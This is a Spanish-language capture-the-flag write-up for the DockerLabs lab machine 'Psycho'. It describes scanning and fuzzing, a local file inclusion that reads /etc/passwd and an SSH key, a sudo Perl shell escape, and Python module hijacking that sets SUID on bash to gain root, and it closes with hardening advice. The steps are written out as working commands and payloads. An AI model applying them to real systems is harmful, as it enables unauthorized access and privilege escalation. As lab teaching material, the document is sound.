# Psycho 

### 📄Write-up Técnico - Máquina *Psycho*

---
#### 📄 Información General

- Nombre: Psycho
- Plataforma: DockerLabs
- Dificultad: Fácil
- Autor del write-up: Marcela Jimenez
- Fecha de resolución: 08/04/2026

---
#### Despliegue de la máquina 🚀

La máquina se descarga desde la plataforma [DockerLabs](https://dockerlabs.es/), generalmente a través de un enlace externo (por ejemplo, MEGA).

Proceso de descarga y preparación:

- Descargar el archivo comprimido desde DockerLabs
- El archivo descargado tiene formato ```.zip```
- Se descomprime:
```bash
unzip psycho.zip
```
-  Tras la descompresión, se obtiene un archivo ```.tar```:
```bash
psycho.tar
```
Para desplegar la máquina, se utiliza el script proporcionado:
```bash
bash auto_deploy.sh psycho.tar
```
Este script carga la imagen, crea el contenedor y asigna la red interna.

---
#### 📁 Preparación del entorno de trabajo

Se organiza el entorno local creando directorios para estructurar el análisis:

```bash
mkdir psycho
cd psycho
mkdir nmap
```

Esto permite almacenar resultados de forma ordenada, especialmente los escaneos iniciales.

---
#### Enumeración 🔍

##### Verificación de conectividad

Se realiza un ping:

```bash
ping -c 1 172.17.0.2
```

Resultado:
TTL 64 ->Indicativo de sistema Linux (no concluyente, pero orientativo)

---
#### Escaneo con Nmap 🔍

```bash
nmap -p- --open -sCV -sS -Pn -vvv -oN first_scan.txt 172.17.0.2
```
##### Explicación de parámetros
|Parámetro|Descripción|
|---|---|
|`-p-`|Escanea los 65535 puertos|
|`--open`|Muestra solo puertos abiertos|
|`-sC`|Scripts por defecto de Nmap|
|`-sV`|Detección de versiones|
|`-sS`|SYN scan (half-open)|
|`-Pn`|Omite descubrimiento de host|
|`-vvv`|Máxima verbosidad|
|`-oN`|Guarda salida en archivo|
##### Resultados:
|Puerto|Servicio|
|---|---|
|22|SSH|
|80|HTTP|

---
#### Análisis del servicio web 🌐

Al acceder al navegador:
```bash
http://172.17.0.2
```
Se observa:
```bash
[!] ERROR [!]
```
Esto sugiere un posible fallo en la gestión de errores.

---
#### Fuzzing de directorios con Wfuzz 📂

Primera ejecución:

```bash
wfuzz -c -t 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt http://172.17.0.2/FUZZ/
```
Parámetros:

|Parámetro|Función|
|---|---|
|`-c`|Salida en color|
|`-t 200`|200 hilos concurrentes|
|`-w`|Wordlist|
|`FUZZ`|Punto de inyección|
##### Filtrado de resultados

Se observa que muchas respuestas tienen 9 líneas:

```bash
wfuzz -c --hl=9 -t 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt http://172.17.0.2/FUZZ/
```

|Parámetro|Función|
|---|---|
|`--hl=9`|Oculta respuestas con 9 líneas|
Resultados:

- /assets
- /index.php

##### Revisión de /assets 🔎

Se encuentra un archivo:
- background.jpg

Se analizan metadatos -> sin información relevante

---
#### Fuzzing de parámetros (detección LFI)

```bash
wfuzz -c --hw=169 -t 200 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://172.17.0.2/index.php?FUZZ=../../../../../../../etc/passwd/"
```

|Parámetro|Función|
|---|---|
|`--hw=169`|Oculta respuestas con 169 palabras|
|`-u`|URL objetivo|
|`FUZZ`|Punto de fuzzing|
|Payload|LFI (`/etc/passwd`)|
Resultado
- Parámetro encontrado: ```secret``` 

---
#### Explotación LFI 💥

```bash
http://172.17.0.2/index.php?secret=../../../../../etc/passwd
```
##### Evidencia
Se obtiene contenido ```/etc/passwd```.

---
#### Enumeración de usuarios

Usuarios relevantes:
- luisillo
- vaxei

---
#### Obtención de clave privada SSH 🔑

Mediante LFI se accede a la clave privada de vaxei.

---
#### Manejo de ```id_rsa```

##### Guardado
```bash
vim id_rsa
```
Se pega la clave completa.

---
##### Permisos
```bash
chmod 600 id_rsa
```
##### Explicación
- Solo el propietario puede leer/escribir
- SSH rechaza claves con permisos inseguros

---
#### Acceso SSH🔐

```bash
ssh -i id_rsa vaxei@172.17.0.2
```

Acceso como vaxei

---
#### Movimiento lateral (vaxei -> luisillo) 🔄

##### Enumeración

```bash
sudo -l
```

##### Hallazgo crítico 📌

El usuario vaxei puede ejecutar comandos como luisillo usando *Perl*

---
##### Explotación

```bash
sudo -u luisillo perl -e 'exec "/bin/bash";'
```

Se obtiene shell como luisillo

---
#### Escalada de privilegios🔺

##### Enumeración 

```bash
sudo -l
```
##### Hallazgo

El usuario luisillo puede ejecutar:

```bash
/usr/bin/python3 /opt/paw.py
```

como root.

---
#### Análisis del script 🧠

Ruta:

```bash
/opt/paw.py
```
El script contiene:
```bash
subprocess.run(['echo Hello!'], check=True)
```

---
##### Error observado⚠️

```bash
FileNotFoundError: No such file or directory: 'echo Hello!'
```

---
##### Interpretación 
- Dependencia del PATH
- Posible explotación mediante PATH Hijacking

---
##### Explotación - PATH Hijacking 💣

- Ver PATH

```bash
echo $PATH
```

- Modificar PATH

```bash
export PATH=/opt:$PATH
```

- Crear módulo malicioso:

```bash
nano /opt/subprocess.py
```

Contenido:

```bash
import os
os.system("chmod u+s /bin/bash")
```

##### Explicación 
- Se reemplaza el módulo subprocess
- Python ejecuta nuestro código como root
- Se asigna SUID a bash 

- Ejecutar el exploit

```bash
sudo -u root /usr/bin/python3 /opt/paw.py
```

---
#### Obtener root

```bash
bash -p
whoami
```

Resultado:

```bash
root
```

--- 
#### Cadena completa de ataque 🧩

- Escaneo -> servicios expuestos
- Fuzzing -> rutas ocultas
- Fuzzing -> parámetro vulnerable
- LFI -> lectura de archivos
- LFI -> Obtención de clave SSH
- SSH -> acceso como vaxei 
- sudo + Perl -> acceso a luisillo
- sudo + Python -> ejecución como root
- PATH Hijacking -> ejecución arbitraria
- SUID bash -> root

---
#### Recomendaciones 🛡️

- Validar entradas en aplicaciones web
- Evitar exposición de archivos sensibles
- Restringir uso de sudo
- Usar rutas absolutas de scripts
- Controlar variables de entorno
- Revisar imports en Python

---
#### Conclusión

La máquina muestra como una cadena de vulnerabilidades aparentemente simples puede derivar en compromiso total del sistema.

Especialmente crítico:

- Vulnerabilidad LFI
- Exposición de credenciales
- Configuración insegura de sudo
- Falta de control en ejecución de scripts

---
